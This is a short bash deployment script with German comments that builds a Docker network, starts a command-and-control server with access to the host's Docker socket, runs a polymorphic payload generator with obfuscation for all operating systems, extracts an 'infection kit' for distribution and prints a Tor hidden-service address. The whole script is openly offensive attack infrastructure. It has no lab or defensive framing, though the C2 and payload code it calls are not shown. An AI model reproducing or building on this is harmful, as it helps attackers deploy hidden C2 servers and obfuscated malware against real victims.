#!/bin/bash

# Erstelle virtuelles Angriffsnetzwerk
docker network create --driver=bridge --subnet=10.13.37.0/24 apt_net

# Starte C2-Server
docker build -t apt_c2 c2_server/
docker run -d --network=apt_net --ip=10.13.37.2 -v /var/run/docker.sock:/var/run/docker.sock apt_c2

# Kompiliere polymorphen Payload
docker exec apt_c2 python3 polymorphic_engine.py --os=all --advanced-obfuscation

# Verteile Infektion
docker cp apt_c2:/app/payloads/infection_kit.zip .
unzip infection_kit.zip -d payloads/

echo "[+] Deployment abgeschlossen. Onion-URL:"
docker exec apt_c2 cat /var/lib/tor/hidden_service/hostname
